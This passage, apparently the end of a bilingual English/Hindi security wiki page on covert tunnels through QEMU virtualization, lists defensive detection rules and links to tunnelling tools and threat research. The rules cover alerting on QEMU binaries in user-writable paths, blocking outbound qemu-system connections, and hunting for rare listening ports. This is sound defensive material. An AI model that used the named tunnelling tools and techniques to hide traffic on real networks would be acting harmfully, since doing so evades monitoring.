• user-writable paths में अनपेक्षित **QEMU/VirtualBox/KVM binaries** पर अलर्ट करें।  
• Block outbound connections that originate from `qemu-system*.exe`.  
• `qemu-system*.exe` से आरंभ होने वाले outbound कनेक्शनों को ब्लॉक करें।  
• Hunt for rare listening ports (2222, 10022, …) binding immediately after a QEMU launch.  
• QEMU लॉन्च के तुरंत बाद bind होने वाले दुर्लभ listening ports (2222, 10022, …) की खोज करें।

---

## Other tools to check

## जांच करने के लिए अन्य टूल

- [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
- [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)

## References

## संदर्भ

- [Hiding in the Shadows: Covert Tunnels via QEMU Virtualization](https://trustedsec.com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)

{{#include ../banners/hacktricks-training.md}}
